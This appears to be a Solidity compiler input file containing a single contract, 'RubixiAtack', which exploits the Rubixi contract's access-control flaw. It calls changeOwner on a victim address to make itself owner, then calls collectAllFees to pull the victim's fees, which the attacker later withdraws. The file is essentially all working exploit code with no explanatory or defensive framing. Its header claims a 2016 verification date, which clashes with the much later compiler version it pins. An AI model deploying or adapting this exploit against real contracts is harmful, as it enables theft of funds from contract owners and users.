{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "contracts/Rubixi/RubixiAttack2.sol": {
      "content": "/**\n *Submitted for verification at Etherscan.io on 2016-03-25\n*/\n//SPDX-License-Identifier: private\npragma solidity ^0.6.6;\n\ninterface Rubixi {\n\n        //Fee functions for creator\n        function collectAllFees() external ;\n\n        //Functions for changing variables related to the contract\n        function changeOwner(address _owner) external ;\n \n}\n\n\ncontract RubixiAtack{\n    address payable public owner;\n        \n    constructor() public {\n        owner = payable(msg.sender);\n    }\n        \n    modifier onlyOwner {\n        require(\n            msg.sender == owner,\n            \"caller is not the owner\"\n        );\n        _;\n    }\n    \n    function attack(address _victim) external {\n        Rubixi(_victim).changeOwner(address(this));\n        Rubixi(_victim).collectAllFees();\n    }\n    \n        /// @return contract balance\n    function contractBalance() external view returns (uint) {\n        return address(this).balance;\n    }\n    \n     /// withdraw balance to owner\n    function withdraw() external onlyOwner {\n        owner.transfer(address(this).balance);\n     }\n    \n    \n    fallback( ) external payable { }\n    receive ( ) external payable { }\n}\n    "
    }
  }
}